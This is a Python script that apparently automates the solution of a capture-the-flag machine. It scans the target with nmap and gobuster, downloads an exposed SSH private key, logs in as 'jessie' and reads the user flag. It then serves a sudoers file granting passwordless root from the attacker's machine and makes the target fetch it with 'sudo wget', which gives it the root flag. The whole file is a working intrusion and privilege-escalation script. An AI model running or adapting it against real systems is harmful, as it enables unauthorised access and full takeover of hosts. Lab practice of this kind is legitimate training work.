import subprocess
import requests
import re
import os
import threading
from http.server import HTTPServer,BaseHTTPRequestHandler
import urllib3
import paramiko
import time



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def nmapScan(ip):
    print(f"\n\nPerforming nmap Scan to the IP : {ip}\n")

    cmd=["sudo","nmap","-sS","-sV","-sC","-T4","-O","-v",f"{ip}"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    nmap_output=result.stdout

    open_ports = re.findall(r"^(\d+)/[a-zA-Z]+\s+open", nmap_output, re.MULTILINE)

    return open_ports


def goBuster(url):
    print(f"Performing GoBuster in this url :  {url}")

    cmd=["gobuster","dir","-u",f"{url}","-w","/usr/share/wordlists/dirb/common.txt"]

    result=subprocess.run(cmd,capture_output=True,text=True)

    if result.returncode!=0:
        return RuntimeError(result.stderr)
    
    output=result.stdout

    return output

def runTerminalServer():
    print("\n\nStarting python HTTP server at port 80 ...")
    subprocess.run(["python3", "-m", "http.server", "8000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def main():

    IP=input("What is the Target machine IP : ")
    AttackerMachineIp=input("What is the Attacker machine IP : ")
    print("Challenge Started\n\n")

    # print(nmapScan(IP))
    url_1=f"http://{IP}"
    #print(goBuster(url_1))
    url_2=f"{url_1}/sitemap"
    #print(goBuster(url_2))
    url_3=f"{url_2}/.ssh"
    #print(goBuster(url_3))
    url_4=url_3+"/id_rsa"
    r=requests.get(url_4,verify=False)

    with open("id_rsa","w") as f:
        f.write(r.text)

    os.chmod("id_rsa",0o600)

    print("\n\nConnecting Via SSH......\n\n")

    key=paramiko.RSAKey.from_private_key_file("id_rsa")
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(IP,username="jessie",pkey=key)

    print(f" Now Conencted to the {IP} via SSH")

    stdin, stdout,stderr=ssh.exec_command("find | grep flag")

    location_of_flag=stdout.read().decode()

    print(location_of_flag)

    stdin, stdout,stderr=ssh.exec_command("cat /home/jessie/Documents/user_flag.txt")

    userFlag=stdout.read().decode().strip()

    print(f"The User Flag is : {userFlag}")


    with open("jessie","w") as f:
        f.write("jessie ALL=(ALL) NOPASSWD:ALL")

    serverThread=threading.Thread(target=runTerminalServer)

    serverThread.daemon=True
    serverThread.start()

    time.sleep(1)

   

    stdin, stdout,stderr=ssh.exec_command(f"sudo wget http://{AttackerMachineIp}:8000/jessie -O /etc/sudoers.d/jessie")

    time.sleep(2)


    stdin, stdout,stderr=ssh.exec_command("sudo cat /root/root_flag.txt")

    rootFlag=stdout.read().decode().strip()

    print(f"\n\n\nThe final root flag is : {rootFlag}")





main()








